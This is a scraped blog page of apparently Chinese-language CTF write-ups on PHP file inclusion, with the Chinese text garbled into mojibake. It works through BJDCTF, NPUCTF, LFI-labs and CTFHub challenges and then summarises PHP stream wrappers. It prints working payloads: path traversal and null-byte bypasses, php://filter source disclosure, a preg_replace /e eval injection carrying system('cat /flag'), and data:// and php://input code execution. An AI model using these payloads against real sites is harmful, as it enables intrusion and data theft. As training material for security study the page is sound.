<h1 id="ä¸è¿‡å¦‚æ­¤"><a href="#ä¸è¿‡å¦‚æ­¤" class="headerlink" title="ä¸è¿‡å¦‚æ­¤"></a>ä¸è¿‡å¦‚æ­¤</h1><p>æ¥æºï¼šBJDCTF2020</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;63a6bf86-6f35-4685-9693-114742732cf8.node3.buuoj.cn&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line">        &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æºç å‘ç°ï¼Œéœ€è¦æäº¤idå’Œcmdï¼Œå…¶ä¸­cmdå¯ä»¥è¢«æ‰§è¡Œ</p>
<p>æ­¤å¤„è€ƒå¯Ÿpreg_matchçš„/eæ‰§è¡Œï¼Œ<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
<p>æ€»ä¹‹å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ‰§è¡Œå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¾“å…¥å‚æ•°ã€‚è€Œ\S*åœ¨æ­£åˆ™ä¸­ä»£è¡¨åŒ¹é…çš„ä»»æ„éç©ºå­—ç¬¦</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure>
<h1 id="ezincludeï¼ˆæœªå®Œæˆï¼‰"><a href="#ezincludeï¼ˆæœªå®Œæˆï¼‰" class="headerlink" title="ezincludeï¼ˆæœªå®Œæˆï¼‰"></a>ezincludeï¼ˆæœªå®Œæˆï¼‰</h1><p>æ¥æºï¼šNPUCTF 2020</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flflflflag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;&#x2F;title&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flflflflag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">           window.location.href&#x3D;&quot;404.html&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_Ã¥Â‡ÂºÃ©Â¢Â˜Ã¤ÂºÂº_wants_girlfriend&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;</span><br><span class="line">	die(&#39;nonono&#39;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#39;include($_GET[&quot;file&quot;])&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;;</span><br><span class="line">@$name&#x3D;$_GET[&#39;name&#39;];</span><br><span class="line">@$pass&#x3D;$_GET[&#39;pass&#39;];</span><br><span class="line">if(md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass)&#123;</span><br><span class="line">	echo &#39;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">           window.location.href&#x3D;&quot;flflflflag.php&quot;;</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line">&#39;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);</span><br><span class="line">	echo &quot;username&#x2F;password error&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">ÂŠw%ude($_GET[&quot;~)^&quot;])</span><br></pre></td></tr></table></figure>
<p>è¯´æ˜è¦æäº¤æ­£ç¡®çš„nameå’Œpass</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$secret&#x3D;&#39;%^$&amp;$#fffdflag_is_not_here_ha_ha&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">ÂŠw%ude($_GET[&quot;~)^&quot;])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%^$&amp;$#fffdflag_is_not_here_ha_ha</span><br><span class="line">1</span><br><span class="line">%^$&amp;$#fffdflag_is_not_here_ha_ha</span><br></pre></td></tr></table></figure>
<p>ä¹‹åéœ€è¦ç”¨åˆ°PHP segfaultä¸Šä¼ shellï¼Œä¸çŸ¥é“æ˜¯å•¥ï¼Œå†è¯´å§</p>
<h1 id="LFI-labs"><a href="#LFI-labs" class="headerlink" title="LFI labs"></a>LFI labs</h1><p>åœ¨phpstudyçš„æ ¹ç›®å½•wwwä¸‹æœ‰ä¸€ä¸ªphpinfo.phpï¼Œä»¥è®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶ä¸ºç›®æ ‡</p>
<h2 id="LFI-1"><a href="#LFI-1" class="headerlink" title="LFI-1"></a>LFI-1</h2><p>åŸphpæ–‡ä»¶è·¯å¾„ä¸­ï¼Œform actionå¤„è·¯å¾„æœ‰é—®é¢˜ï¼Œè¾“å…¥å‚æ•°åæ— æ³•è·³è½¬åˆ°æ­£ç¡®é¡µé¢ï¼Œä¿®æ”¹ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;..&#x2F;LFI-1&#x2F;index.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>ä¹‹åè®¿é—®URL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-1&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
<h2 id="LFI-2"><a href="#LFI-2" class="headerlink" title="LFI-2"></a>LFI-2</h2><p>è€ƒå¯Ÿï¼š%00æˆªæ–­</p>
<p>è§‚å¯Ÿindex.phpï¼Œå…³é”®è¯­å¥ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;includes&#x2F;&quot;.$_GET[&#39;library&#39;].&quot;.php&quot;); </span><br></pre></td></tr></table></figure>
<p>éœ€è¦ç©¿é€includesç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo</span><br></pre></td></tr></table></figure>
<p>å­¦ä¹ wpï¼Œå‘ç°æœ¬é¢˜è€ƒçš„ä¸æ˜¯è¿™ä¸ªã€‚è¦æ˜¯å…¶åæ·»åŠ çš„åç¼€ä¸æ˜¯.phpï¼Œåˆ™è¿™ä¸ªè§£æ³•ä¸èƒ½é€šè¿‡</p>
<p>æ­£ç¡®çš„å§¿åŠ¿</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo.php%00</span><br></pre></td></tr></table></figure>


<h3 id="error-reporting-E-ALL-amp-E-NOTICE-amp-E-WARNING"><a href="#error-reporting-E-ALL-amp-E-NOTICE-amp-E-WARNING" class="headerlink" title="error_reporting(E_ALL &amp; ~E_NOTICE &amp; ~E_WARNING);"></a>error_reporting(E_ALL &amp; ~E_NOTICE &amp; ~E_WARNING);</h3><p>æŠ¥å‘Šé™¤äº†E_NOTICEå’ŒE_WARNINGä¹‹å¤–çš„æ‰€æœ‰é”™è¯¯</p>
<h2 id="LFI-3"><a href="#LFI-3" class="headerlink" title="LFI-3"></a>LFI-3</h2><p>å…³é”®è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (substr($_GET[&#39;file&#39;], -4, 4) !&#x3D; &#39;.php&#39;)</span><br></pre></td></tr></table></figure>
<p>/.ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo.</span><br><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo.&#x2F;</span><br></pre></td></tr></table></figure>
<p>æœ¬é¢˜ç¯å¢ƒæœ‰é—®é¢˜ï¼Œæ­¤å¤„ç›´æ¥æŠ„çš„wp</p>
<h2 id="LFI-4"><a href="#LFI-4" class="headerlink" title="LFI-4"></a>LFI-4</h2><p>è€ƒå¯Ÿï¼šä¸åŠ åç¼€ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-4&#x2F;index.php?class&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo</span><br></pre></td></tr></table></figure>
<p><strong>é”™è¯¯çš„å°è¯•</strong></p>
<p>å°è¯•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?class&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo.php%00</span><br></pre></td></tr></table></figure>
<p>è¢«è½¬ç ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">includes&#x2F;class_&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo.php\0.php </span><br></pre></td></tr></table></figure>
<p><strong>addslashesåœ¨ctfä¸­ç­‰äºæ— æ³•ç»•è¿‡</strong></p>
<h2 id="LFI-5"><a href="#LFI-5" class="headerlink" title="LFI-5"></a>LFI-5</h2><p>è€ƒå¯Ÿï¼šåŒå†™ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
<h2 id="LFI-6"><a href="#LFI-6" class="headerlink" title="LFI-6"></a>LFI-6</h2><p>è€ƒå¯Ÿï¼špostæäº¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post data: page&#x3D;..&#x2F;..&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
<h2 id="LFI-7-14"><a href="#LFI-7-14" class="headerlink" title="LFI-7~14"></a>LFI-7~14</h2><p>åŸºæœ¬ç›¸åŒï¼Œä¸å†èµ˜è¿°</p>
<h1 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h1><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-4174fe1e3951e1c9.sandbox.ctfhub.com:10080&#x2F;index.php?file&#x3D;shell.txt</span><br><span class="line">post data: ctfhub&#x3D;system(&#39;ls&#39;);</span><br><span class="line">post data: ctfhub&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="çŸ¥è¯†ç‚¹æ€»ç»“"><a href="#çŸ¥è¯†ç‚¹æ€»ç»“" class="headerlink" title="çŸ¥è¯†ç‚¹æ€»ç»“"></a>çŸ¥è¯†ç‚¹æ€»ç»“</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p>
<p>å››ä¸ªå‡½æ•°</p>
<p>include(), include_once(), require(), require_once()</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html%EF%BC%8Chttps://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">https://www.cnblogs.com/wjrblogs/p/12285202.htmlï¼Œhttps://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">http:&#x2F;&#x2F; â€” è®¿é—® HTTP(s) ç½‘å€</span><br><span class="line">ftp:&#x2F;&#x2F; â€” è®¿é—® FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; â€” è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµï¼ˆI&#x2F;O streamsï¼‰</span><br><span class="line">zlib:&#x2F;&#x2F; â€” å‹ç¼©æµ</span><br><span class="line">data:&#x2F;&#x2F; â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span><br><span class="line">glob:&#x2F;&#x2F; â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><br><span class="line">phar:&#x2F;&#x2F; â€” PHP å½’æ¡£</span><br><span class="line">ssh2:&#x2F;&#x2F; â€” Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; â€” RAR</span><br><span class="line">ogg:&#x2F;&#x2F; â€” éŸ³é¢‘æµ</span><br><span class="line">expect:&#x2F;&#x2F; â€” å¤„ç†äº¤äº’å¼çš„æµ</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸åŒçš„ä¼ªåè®®ä¸­ï¼Œéœ€è¦allow_url_fopenå’Œallow_url_includeçš„å¼€å¯çŠ¶æ€æ˜¯ä¸åŒçš„</p>
<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># è®¿é—®æœ¬åœ°æ–‡ä»¶</span><br><span class="line"># ä¸å—allow_url_fopenå’Œallow_url_includeå½±å“</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.xx.com?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passswd #æ­¤å¤„ä¸ºç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure>
<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨<br>ä¸å—allow_url_openå’Œallow_url_includeå½±å“</p>
<h4 id="å››ä¸ªå‚æ•°"><a href="#å››ä¸ªå‚æ•°" class="headerlink" title="å››ä¸ªå‚æ•°"></a>å››ä¸ªå‚æ•°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource&#x3D;&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;     è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</span><br><span class="line">read&#x3D;&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;         è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</span><br><span class="line">write&#x3D;&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;    è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</span><br><span class="line">&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;        ä»»ä½•æ²¡æœ‰ä»¥ read&#x3D; æˆ– write&#x3D; ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</span><br></pre></td></tr></table></figure>
<h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xx.com?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php</span><br><span class="line"># æŠŠè¾“å…¥æµè¿›è¡Œbase64ç¼–ç </span><br></pre></td></tr></table></figure>
<p>è½¬æ¢è¿‡æ»¤å™¨ï¼šconvert.base64-encodeï¼Œconvert.base64-decode</p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œè¯»å–postä¸­æœªè§£æçš„åŸå§‹æ•°æ®</p>
<p>éœ€è¦allow_url_includeå¼€å¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># è¯»å–postæ•°æ®</span><br><span class="line">http:&#x2F;&#x2F;www.xx.com&#x2F;cmd.php?file&#x3D;php:&#x2F;&#x2F;input</span><br></pre></td></tr></table></figure>
<h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><p>æ•°æ®æµå°è£…å™¨</p>
<p>éœ€è¦allow_urul_ioncludeallow_url_includeæ‰“å¼€</p>
<h3 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="zip-ï¼Œbzip2-ï¼Œzlib"><a href="#zip-ï¼Œbzip2-ï¼Œzlib" class="headerlink" title="zip://ï¼Œbzip2://ï¼Œzlib://"></a>zip://ï¼Œbzip2://ï¼Œzlib://</h2><p>ç”¨äºæ‰“å¼€å‹ç¼©æ–‡ä»¶</p>
<p>ä¸å—allow_url_fopenå’Œallow_url_includeçš„å½±å“</p>
<h3 id="ç¤ºä¾‹-2"><a href="#ç¤ºä¾‹-2" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;zip:&#x2F;&#x2F;C:\Users\liuxianglai\Desktop\test.jpg%23zip.txt</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;C:&#x2F;Users&#x2F;liuxianglai&#x2F;Desktop&#x2F;test.bz2</span><br></pre></td></tr></table></figure>
<h3 id="zip-ä¼ªåè®®"><a href="#zip-ä¼ªåè®®" class="headerlink" title="zip://ä¼ªåè®®"></a>zip://ä¼ªåè®®</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;ç»å¯¹è·¯å¾„%23è¦è§£å‹çš„æ–‡ä»¶&amp;å‚æ•°1&#x3D;å€¼1&amp;å‚æ•°2&#x3D;å€¼2</span><br><span class="line">?fp&#x3D;zip:&#x2F;&#x2F;xxx.png%23shell&amp;param1&#x3D;system&amp;param2&#x3D;pwd</span><br></pre></td></tr></table></figure>
<h2 id="phar-ä¼ªåè®®"><a href="#phar-ä¼ªåè®®" class="headerlink" title="phar://ä¼ªåè®®"></a>phar://ä¼ªåè®®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;ç›¸å¯¹è·¯å¾„&#x2F;phar</span><br><span class="line">?fp&#x3D;phar:&#x2F;&#x2F;xxx.png&#x2F;phar</span><br></pre></td></tr></table></figure>
<h2 id="å¯ä»¥è¾“å…¥æ•°æ®çš„åè®®"><a href="#å¯ä»¥è¾“å…¥æ•°æ®çš„åè®®" class="headerlink" title="å¯ä»¥è¾“å…¥æ•°æ®çš„åè®®"></a>å¯ä»¥è¾“å…¥æ•°æ®çš„åè®®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;inputï¼Œä¹‹åpostæäº¤æ•°æ®</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,xxx</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;palin;base64,xxxï¼ˆbase64ç¼–ç ï¼‰</span><br></pre></td></tr></table></figure>


<h2 id="è¿˜æ²¡å­¦åˆ°çš„"><a href="#è¿˜æ²¡å­¦åˆ°çš„" class="headerlink" title="è¿˜æ²¡å­¦åˆ°çš„"></a>è¿˜æ²¡å­¦åˆ°çš„</h2><p>åŒ…å«æ—¥å¿—</p>
<p>åŒ…å«ç¯å¢ƒå˜é‡environ</p>
<p>åˆ©ç”¨session</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/22/CTF-Web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="ckkw052jk0001bsusa5z61ho8" data-title="CTF-Web-æ–‡ä»¶åŒ…å«" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-SQLæ³¨å…¥" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2021-01-20T00:47:08.000Z" itemprop="datePublished">2021-01-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/">CTF-Web-SQLæ³¨å…¥</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="éšä¾¿æ³¨"><a href="#éšä¾¿æ³¨" class="headerlink" title="éšä¾¿æ³¨"></a>éšä¾¿æ³¨</h1><p>é¢˜ç›®æ¥æºï¼šå¼ºç½‘æ¯2019</p>
